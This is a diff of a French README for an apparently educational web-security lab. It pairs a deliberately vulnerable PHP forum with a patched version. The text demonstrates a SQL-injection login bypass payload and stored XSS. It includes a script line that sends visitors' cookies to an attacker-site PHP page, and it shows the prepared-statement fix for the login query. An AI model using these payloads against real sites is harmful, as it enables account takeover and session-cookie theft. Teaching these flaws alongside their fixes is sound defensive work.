@@ -9,21 +9,21 @@ L’application est un forum de discussion informatique. qui offre la possibilit
 **Prérequis:**
 
    - installer [WampServer](https://www.wampserver.com/)
-   - mettre tous les 3 repertoires (siteattaquant, myforum et myforumsecu) à la racine du rempertoire www de wamp (e.g sur windows: `C:\wamp64\www`)
+   - mettre tous les 3 répertoires (siteattaquant, myforum et myforumsecu) à la racine du répertoire www de wamp (e.g sur windows: `C:\wamp64\www`)
    - importer la base de données `myforum.sql` dans phpmyadmin
 ## Mise en évidence d’une faille d’injection SQL
 
-Pour contribuer au forum c’est-à-dire réponndre créer un sujet, ecrire un message, l’on a besoin de se connecter avec un pseudo et un mot de mot de passe. 
+Pour contribuer au forum c’est-à-dire répondre créer un sujet, ecrire un message, l’on a besoin de se connecter avec un pseudo et un mot de mot de passe. 
 Ici nous verons que même un utilisateur qui n’a pas de compte peut se connecter fraduleusement et causer des degâts  avec de l’injection SQL dans la page de login.
 
-Dans la page de connexion nous rentrons le pseudo d’un utilisateur existant toto par exemple et password qui n’est pas celle de l’utilisateur toto: " or ""="
-et on vois que nous sommes connectés comme etabt l’utilisateur toto. Ce qui nous permet de créer des sujets en tant que utilisateur toto
+Dans la page de connexion nous rentrons le pseudo d’un utilisateur existant `toto` par exemple et unpassword qui n’est pas celle de l’utilisateur toto: `" or ""="` au lieu de `toto`
+et on vois que nous sommes connectés comme étant l’utilisateur **toto**. Ce qui nous permet de créer des sujets en tant que utilisateur **toto**.
 
 ![](https://github.com/ang67/Projet-secu-webapp/blob/main/img/1.png)
 
 ## Solution
 
-Dans la version sécurisé du site (http://localhost/myforumsecu) nous avons utliser les réquêtes préparées dans le code qui êrmet de se connecter (`loger.php`) pour palier ce problème.
+Dans la version sécurisé du site (http://localhost/myforumsecu) nous avons utliser les réquêtes préparées dans le code qui permet de se connecter (`loger.php`) pour palier ce problème.
 l’ancienne ligne:
 `$result =$id_con->query('SELECT * FROM users WHERE id_user="'.$pseudo.'" AND passwd="'.$pass.'" ') ;`
 devient:
@@ -35,7 +35,7 @@ devient:
 
 Dans la version non sécurisée du site (http://localhost/myforum) mettons dans le champs de commentaire le message `<u>hello attaquant</u>`
 
-On constate que la mise en forme html est faite. On se retrouve donc avec hello attaquant. Le plus gros problème est que cette faille est persistante, car inscrite dans la base de données.
+On constate que la mise en forme html est faite. Le plus gros problème est que cette faille est persistante, car inscrite dans la base de données.
 
 Ayant connaissance de cette faille, l'attaquant pourrait casser la structure du site. Comme nous le montrerons ici en injectant du code javascript faisant une redirection vers le site google.com.
 
@@ -45,12 +45,12 @@ On constate qu’à chaque ouverture du sujet contenant le code injecté il y a 
 
 ## Exploitation de la faille
 
-Essayons d’exploiter cette faille pour voler des cookies qui dans un cas précis pourrait permettre à un attaquant de s'attribuer des rôles plus élevés que prévu.
+Essayons d’exploiter cette faille afin e voler des cookies qui dans un cas précis pourrait permettre à un attaquant de s'attribuer des rôles plus élevés que prévu.
 
 Ici nous allons écrire un code PHP (https://github.com/ang67/Projet-secu-webapp/tree/main/siteattaquant/index.php) permettant de récupérer les cookies des utilisateurs.
-Ce code se trouve peut se trouver sur un autre serveur distant (celui de l’attaquant par exemple https://github.com/ang67/Projet-secu-webapp/tree/main/siteattaquant ). Dans ce code on récupère les cookies, puis on les stocke et enfin, on redirige l’utilisateur vers l’accueil comme si rien ne s’était passé. Pour notre exemple le site a décidé de sauvegarder les mots de passe et login pour permettre de se souvenir de l’utilisateur lors d’une nouvelle connection.
+Ce code peut se trouver sur un autre serveur distant (celui de l’attaquant par exemple https://github.com/ang67/Projet-secu-webapp/tree/main/siteattaquant ). Dans ce code on récupère les cookies, puis on les stocke et enfin, on redirige l’utilisateur vers la page d’accueil comme si rien ne s’était passé. Pour notre exemple le site a décidé de sauvegarder les mots de passe et login pour permettre de se souvenir de l’utilisateur lors d’une nouvelle connexion.
 
-Maintenant l’attainjectons un code javascript dans un message ou dans un sujet qui redirige vers le code PHP malveillant.
+Maintenant l’attaquant injecte un code javascript dans un message ou dans un sujet qui redirige vers le code PHP malveillant.
 
 `<script>document.location="http://localhost/siteattaquant?cookie="+document.cookie;</script>`
 
